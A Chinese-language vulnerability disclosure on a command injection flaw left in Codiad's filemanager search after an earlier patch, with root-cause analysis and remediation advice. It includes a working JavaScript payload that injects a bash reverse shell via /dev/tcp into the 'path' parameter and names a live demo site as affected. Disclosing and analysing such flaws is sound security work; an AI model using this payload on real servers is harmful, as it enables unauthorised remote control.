#### 简介 :
    Codiad 是一个开源基于Web的IDE应用程序，用于在线编写和编辑代码。
    这个应用程序采用PHP开发，并且不需要一个SQL数据库，数据是存储在一个JSON格式的文件中。
    它的界面包含三个面板：
      项目/文件管理器具
      代码编辑器
      菜单/功能
> [Codiad GitHub](https://github.com/Codiad/Codiad)
* * *
#### 引子 :
之前在 XMAN 选拔赛中发现了一 Codiad 的一个远程命令执行漏洞  
> 参考之前的分析文章 : 
报告给开发者之后开发者反应非常迅速 , 基本一两天立刻修复了这个漏洞  
> 
修复这个漏洞的 commit 如下 :  
>
> 
最近一直比较忙 , 开发者修复了之后笔者也并没有对其进行进一步地审计和测试  
昨天下午抽出一段时间看了一下  
发现开发者的 patch 还是存在不完善的地方 :  
漏洞存在的点依然是在 :  
>
> 
这个文件中 , 经过对数据流的分析 , 发现参数 $_GET['path'] 并没有被当做命令的参数进行那么严格的过滤  
只是仅仅将其作为一个路径进行了过滤 , 那么这就给了我们继续进行命令注入的余地
这里测试一下是否可以执行命令 :
发现执行 id 命令后并没有回显 , 那么我们就需要让命令执行的效果显示出来  
这里为了让命令的效果显示出来 , 使用 ping 和 tcpdump 来测试
    tcpdump -i lo -X icmp
    ping -c 1 127.0.0.1
可以发现当我们执行 ping 命令的时候确实抓到了 ping 本地的流量  
说明命令确实是被执行了  
这里放大命令效果的方法还很多 , 举出几个例子 :
    1. 通过网络流量 (控制命令发出网络流量 , 并检测是否可以监听到流量)
      a. nc
      b. icmp
      ...
    2. 通过IO (控制命令向一个可写的目录 / 文件中写入数据 , 检测文件内容是否存在变化)
    ...
既然已经可以执行系统命令了 , 那么这一段渗透测试即可结束 , 可以通过一个反弹 shell 的命令直接获取到目标服务器的权限
* * *
#### 给出一个 Reverse Shell 的 payload
    ip = "8.8.8.8;
    port = "8888";
    $.get("components/project/controller.php?action=get_current",
    function(d) {
        p = JSON.parse(d)['data']['path'];
        $.get("components/filemanager/controller.php?action=search&path="+p+"`bash -c 'sh -i %26>/dev/tcp/"+ip+"/"+port+" 0>%261'`", function(c){console.log(c)});
    });
* * *
#### 影响版本 :
    所有版本
* * *
#### 总结 :
    修复漏洞的时候不应该只看到已存在的攻击向量
    应该从根本上解决问题 , 比如本文中分析的漏洞
    漏洞的成因在于 : 
    1. 未将系统命令的参数进行有效的过滤
    2. 得到漏洞报告后并没有分析并对所有参数进行过滤 , 只是过滤了攻击向量中存在的参数
    还有一个思考是 : 
    在服务端使用某些系统命令的时候 , 如果参数或者命令是用户可控的
    那么一定要对用户输入的参数进行严格地过滤
    更极端一点的情况是 , 如果需要调用 shell 的命令本身并不是特别复杂
    则建议使用脚本语言自己实现命令的功能 , 这样安全性会更有保障
    因为直接调用 shell 命令其实相当于脚本语言与操作系统直接耦合
    并且耦合双方的权限差距很大 , 这样非常容易出现问题
* * *
#### 受到影响的网站 (部分)
>   
 (redirected to
[demo.codiad.com](http://demo.codiad.com/))  
* * *
#### 修补方案 :
    对用户输入的所有可能传入到系统命令中的参数进行严格过滤
* * *
#### 参考资料 :
> [审计笔记(代码注释)](https://github.com/Code-audition/Codiad)